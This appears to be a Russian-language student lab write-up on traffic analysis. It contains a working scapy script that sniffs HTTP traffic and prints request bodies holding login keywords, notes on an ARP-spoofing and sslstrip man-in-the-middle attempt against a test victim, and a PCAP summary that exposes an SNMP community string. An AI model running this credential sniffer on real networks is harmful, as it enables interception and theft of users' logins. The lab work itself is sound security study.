#### Анализ трафика

##### Цель:
* Доработка скрипт packet_sniff.py
* Проанализировать PCAP файл



##### Доработанный скрипт

<details>
<summary>packetsniff.py</summary>

```

#!/usr/bin/python3

import scapy.all as scapy

from scapy.layers import http

def sniff(interface):
  scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)

def get_url(packet):
  if packet.haslayer(http.HTTPRequest):
      url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
      return url

def get_login_info(packet):
  if packet.haslayer(http.HTTPRequest):
      if packet.haslayer(scapy.Raw):
          load = packet[scapy.Raw].load
          #load = str(load)
          keybword = ["usr", "uname", "username", "pwd", "pass", "password"]
          for eachword in keybword:
              if eachword.encode() in load:
                  return load


def process_sniffed_packets(packet):
  if packet.haslayer(http.HTTPRequest):
      url = get_url(packet)
      print("[+] HTTP Request>>" + str(url))

      login_info = get_login_info(packet)
      if login_info:
          print("\n\n[+] Possible username and password >>" + str(login_info) + "\n\n")




sniff("eth0")
```
</summary>

</details>

##### На компьютере атакующего
<details>
<summary>Конфигурация</summary>

  ![alt-текст](/lab-9/img/kos-ifconfig.png)
</summary>


</details>

<details>
<summary>запускаем arpspoof</summary>

  ![alt-текст](/lab-9/img/arpspoof.png)
</summary>

</details>


<details>
<summary>запускаем sslstrip</summary>

  ![alt-текст](/lab-9/img/sslstrip_start.png)
</summary>

</details>

<details>
<summary>результат работы скрипта</summary>

  ![alt-текст](/lab-9/img/packetsniff.py.png)
</summary>
</details>

<details>
<summary>cat sslstrip.log</summary>

##### Видимо sslstrip не может разобрать входящие данные
  ![alt-текст](/lab-9/img/sslstrip-debug.png)
</summary>

</details>
<details>
<summary>результат pscketsniff с ручным вводом адреса</summary>

##### Если вручную забить адрес сайта http://klavogonki.ru , то Url появляется в выводе скрипта.

  ![alt-текст](/lab-9/img/packetsniff-http.png)
</summary>

</details>
##### На компьютере жертвы
<details>
<summary>Конфигурация</summary>

  ![alt-текст](/lab-9/img/client-data.png)
</summary>

</details>

<details>
<summary>site-http</summary>

##### Если вручную забить адрес сайта http://...... , то только белая страница видна

  ![alt-текст](/lab-9/img/site-http.png)
</summary>

</details>

#### Выводы по sslstrip
У меня на тестовом стенде с вновь установленной kali версии(скриншот ниже)
не удалось получить данные из https запроса при помощи sslstrip.

<details>
<summary>version</summary>

![alt-текст](/lab-9/img/kos-version.png)

</summary>  
</details>



##### Анализ файла

<details>
<summary>pcap</summary>

```

1. 192.168.121.10 сообщил что порт gi0/2 отключился.  
2. К сети подключился клиент с маком 00:21:70:e9:bb:47 и получил ip 192.168.30.11 DHCP.
3. 192.168.121.10 сообщил что gi0/2 подключен
4. 2003:51:6012:120:13 опросил  2003:51:6012:120:2 по SNMP c community n5rAD1ig314IqfioYBWw

5. 2003:51:6012:110::b15:22 соеденился по SSH к  2003:51:6012:121::2
6. 192.168.121.2 сообщил(опправил syslog) о том что пакет на соединение попало в разрешающее правило
7. 192.168.121.2 слил по tftp конфиг на 192.168.110.10
```

</summary>

</details>
